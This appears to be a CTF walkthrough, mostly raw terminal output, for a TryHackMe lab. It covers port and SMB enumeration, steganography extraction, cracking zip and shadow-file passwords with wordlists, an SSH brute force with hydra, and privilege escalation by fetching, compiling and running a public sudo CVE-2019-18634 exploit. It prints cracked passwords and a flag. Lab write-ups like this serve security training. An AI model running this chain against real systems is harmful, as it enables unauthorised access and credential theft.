...
```
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ sudo nmap -A -sS -sC -sV -O 10.10.164.126
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-14 10:52 GMT
...
|   Domain name: \x00
|   FQDN: cherryblossom
|_  System time: 2024-10-14T14:53:00+01:00
| smb-security-mode: 
|   account_used: guest
...
```
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ sudo nmap --script smb-enum-shares -vv  10.10.164.126
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-14 10:54 GMT
...
Completed Ping Scan at 15:50, 0.07s elapsed (1 total hosts)
...
Completed SYN Stealth Scan at 10:54, 0.71s elapsed (1000 total ports)
NSE: Script scanning 10.10.164.126.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 10:54
Completed NSE at 10:54, 5.80s elapsed
Nmap scan report for 10.10.164.126
Host is up, received echo-reply ttl 63 (0.041s latency).
Scanned at 2024-10-14 10:54:21 GMT for 7s
Not shown: 997 closed ports
Reason: 997 resets
...
```
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ cat journal.txt | base64 -d > output
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ file output 
output: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ stegpy output
File _journal.zip succesfully extracted from output
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ unzip _journal.zip 
Archive:  _journal.zip
file #1:  bad zipfile offset (local header sig):  0
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ file _journal.zip 
_journal.zip: JPEG image data
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ hexeditor _journal.zip
```

`50 4B 03 04`

```
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ fcrackzip -uDp /usr/share/wordlists/rockyou.txt _journal2.zip
...
```
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ john --wordlist=/usr/share/wordlists/rockyou.txt Journal.hash 
...
```
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ hydra -l lily -P cherry-blossom.list ssh://10.10.164.126
...
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-14 11:26:38
```

`lily:Mr.$un$hin3`

```
nayan@cherryblossom:/var/backups$ cat shadow.bak 
...
```
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ hashcat -m1800 -a0 --force johan.hash cherry-blossom.list
...
Time.Started.....: Mon Oct 14 11:32:19 2024 (14 secs)
Time.Estimated...: Mon Oct 14 11:32:33 2024 (0 secs)
...
Started: Mon Oct 11 11:32:02 2024
Stopped: Mon Oct 14 11:32:34 2024
```

`##scuffleboo##`

```
nayan@cherryblossom:/var/backups$ su - johan
Password: 
nayan@cherryblossom:~$ ls
user.txt
nayan@cherryblossom:~$ cat user.txt 
THM{cb064113d54e24dc84f26b1f63bf3098}
```

```
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
--2024-10-14 11:36:24--  https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
...
2024-10-14 11:36:24 (15.2 MB/s) - ‘exploit.c’ saved [6311/6311]

nayan@kali:~/CTFs/tryhackme/CherryBlossom$ gcc -o exploit exploit.c
nayan@kali:~/CTFs/tryhackme/CherryBlossom$ scp exploit lily@10.10.164.126:/tmp
lily@10.10.164.126's password: 
exploit                                                      100%   17KB 219.7KB/s   00:00
```

```
nayan@cherryblossom:/tmp$ ls
exploit
...
nayan@cherryblossom:/tmp$ ./exploit 
